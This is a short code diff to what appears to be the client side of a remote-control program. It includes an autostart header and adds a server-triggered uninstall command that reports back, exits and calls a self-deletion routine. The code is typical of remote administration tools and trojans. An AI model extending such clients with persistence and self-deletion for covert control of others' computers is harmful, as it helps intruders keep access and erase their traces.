@@ -15,6 +15,7 @@
 #include <common/iniFile.h>
 #include "IOCPUDPClient.h"
 #include "IOCPKCPClient.h"
+#include "auto_start.h"
 
 // UDP 协议仅能针对小包数据，且数据没有时序关联
 IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect) {
@@ -578,6 +579,16 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			m_ClientObject->Send2Server((char*)&bToken, 1);
 			g_bExit = S_CLIENT_EXIT;
 			Mprintf("======> Client exit \n");
+			break;
+		}
+
+	case TOKEN_UNINSTALL:
+		{
+			BYTE	bToken = COMMAND_BYE;// 被控端退出
+			m_ClientObject->Send2Server((char*)&bToken, 1);
+			g_bExit = S_CLIENT_EXIT;
+			self_del(10);
+			Mprintf("======> Client uninstall \n");
 			break;
 		}
 
